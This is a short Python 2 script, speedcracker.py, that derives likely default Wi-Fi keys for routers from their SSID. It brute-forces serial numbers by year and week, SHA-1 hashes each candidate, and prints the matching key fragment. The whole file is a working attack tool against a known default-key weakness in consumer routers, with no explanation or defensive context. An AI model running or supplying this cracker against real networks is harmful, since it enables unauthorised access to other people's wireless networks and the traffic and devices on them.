#!/usr/bin/env python2
 
import sys
import hashlib
from binascii import hexlify as hexl
from itertools import product as prod
 
try:
    import psyco
    psyco.full()
except:
    pass
 
if len(sys.argv) != 2:
    print "speedcracker.py <ssid>"
    sys.exit(1)
 
chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
ssid = sys.argv[1].lower().strip()
 
try:
    int(ssid, 16)
except ValueError:
    print "%s is not a valid SSID." % ssid
    sys.exit(1)
 
for year in range(8,11):
    print "Searching year %02d..." % year
    for week in range(1, 53):
        for xxx in prod(chars, chars, chars):
            xx = "".join(xxx)
            serial = "CP%02d%02d%s" % (year, week, hexl(xx).upper())
            sha = hashlib.sha1(serial).hexdigest()
            if sha.endswith(ssid):
                print "  Likely key: %s (serial %s)." % (sha[:10], "CP%02d%02d??%s" % (year, week, xx))

